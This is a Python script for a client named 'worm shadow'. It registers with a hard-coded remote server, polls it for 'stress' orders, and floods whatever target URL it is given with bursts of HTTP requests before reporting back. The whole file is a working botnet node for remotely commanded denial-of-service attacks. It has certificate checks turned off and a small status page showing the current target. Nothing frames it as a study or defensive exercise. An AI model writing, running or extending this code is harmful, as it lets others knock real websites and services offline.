import threading
import time
import uuid
import requests
import urllib3
from flask import Flask, render_template_string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVER = "https://te-l1hl.onrender.com"   # no trailing slash
CLIENT_ID = f"w-{uuid.uuid4().hex[:6]}"

POLL_INTERVAL = 2.0
HEARTBEAT_INTERVAL = 5.0
CLIENT_PORT = 5001
REQ_TIMEOUT = 35        # > render cold-start window
RETRY_BACKOFF = 3.0

state = {
    "status": "starting",
    "server_ok": False,
    "last_report": "—",
    "target": "—",
}
state_lock = threading.Lock()

app = Flask(__name__)

PAGE = """
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>worm shadow // client</title>
<style>
  body { background:#0d0d0f; color:#d6d6d6; font-family:ui-monospace,Consolas,monospace;
         margin:0; padding:40px; display:flex; flex-direction:column;
         align-items:center; justify-content:center; min-height:100vh; box-sizing:border-box; }
  h1 { font-weight:400; color:#8be9fd; letter-spacing:3px; margin:0 0 8px; font-size:22px; }
  .sub { color:#555; font-size:12px; margin-bottom:40px; }
  .up { font-size:64px; color:#50fa7b; letter-spacing:8px; margin:20px 0; }
  .card { border:1px solid #222; background:#111; padding:20px 28px; border-radius:8px; min-width:340px; }
  table { width:100%; border-collapse:collapse; font-size:13px; }
  td { padding:7px 0; border-bottom:1px solid #1a1a1e; }
  td.k { color:#666; width:120px; }
  .ok { color:#50fa7b; } .bad { color:#ff5555; }
</style>
</head>
<body>
  <h1>worm shadow 🪱 // client</h1>
  <div class="sub">worker status</div>
  <div class="up">UP</div>
  <div class="card">
    <table>
      <tr><td class="k">client id</td><td>{{ cid }}</td></tr>
      <tr><td class="k">server</td><td>{{ server }}</td></tr>
      <tr><td class="k">status</td><td>{{ status }}</td></tr>
      <tr><td class="k">server link</td>
          <td class="{{ 'ok' if server_ok else 'bad' }}">{{ 'connected' if server_ok else 'unreachable' }}</td></tr>
      <tr><td class="k">target</td><td>{{ target }}</td></tr>
      <tr><td class="k">last report</td><td>{{ last_report }}</td></tr>
    </table>
  </div>
</body>
</html>
"""


@app.route("/")
def index():
    with state_lock:
        s = dict(state)
    return render_template_string(
        PAGE,
        cid=CLIENT_ID,
        server=SERVER,
        status=s["status"],
        server_ok=s["server_ok"],
        target=s["target"],
        last_report=s["last_report"],
    )


def set_state(**kw):
    with state_lock:
        state.update(kw)


def run_display():
    app.run(host="0.0.0.0", port=CLIENT_PORT, threaded=True, use_reloader=False)


def post_retry(path, payload):
    """one retry on failure — survives brief network blips and cold restarts"""
    for attempt in (1, 2):
        try:
            r = requests.post(f"{SERVER}{path}", json=payload, timeout=REQ_TIMEOUT, verify=False)
            r.raise_for_status()
            return r
        except Exception as e:
            if attempt == 2:
                raise
            time.sleep(RETRY_BACKOFF)


def report(msg):
    try:
        post_retry("/api/report", {"id": CLIENT_ID, "msg": msg})
        set_state(server_ok=True, last_report=msg)
    except Exception as e:
        set_state(server_ok=False, last_report=f"report failed: {msg} ({e})")


def heartbeat():
    while True:
        try:
            post_retry("/api/register", {"id": CLIENT_ID})
            set_state(server_ok=True)
        except Exception:
            set_state(server_ok=False)
        time.sleep(HEARTBEAT_INTERVAL)


def stress_once(target, rate, window, cooldown):
    delay = window / max(rate, 1)
    ok, fail = 0, 0
    for _ in range(rate):
        try:
            requests.get(target, timeout=10, verify=False)
            ok += 1
        except Exception:
            fail += 1
        time.sleep(delay)
    report(f"burst done to {target}: ok={ok} fail={fail} | cooling {cooldown}s")
    set_state(target=target)
    time.sleep(cooldown)


def main_loop():
    set_state(status="running")
    # first report may take up to ~40s if the render dyno is asleep
    report(f"alive as {CLIENT_ID}")
    while True:
        try:
            r = post_retry("/api/poll", {"id": CLIENT_ID}).json()
            set_state(server_ok=True)
            if r.get("action") == "stress":
                set_state(target=r["target"], status="stressing")
                report(f"received stress order -> {r['target']}")
                stress_once(
                    r["target"],
                    r.get("rate", 10),
                    r.get("window", 3.0),
                    r.get("cooldown", 10.0),
                )
                set_state(status="running")
            else:
                time.sleep(POLL_INTERVAL)
        except Exception as e:
            set_state(server_ok=False, status="server unreachable")
            time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    threading.Thread(target=run_display, daemon=True).start()
    threading.Thread(target=heartbeat, daemon=True).start()
    main_loop()
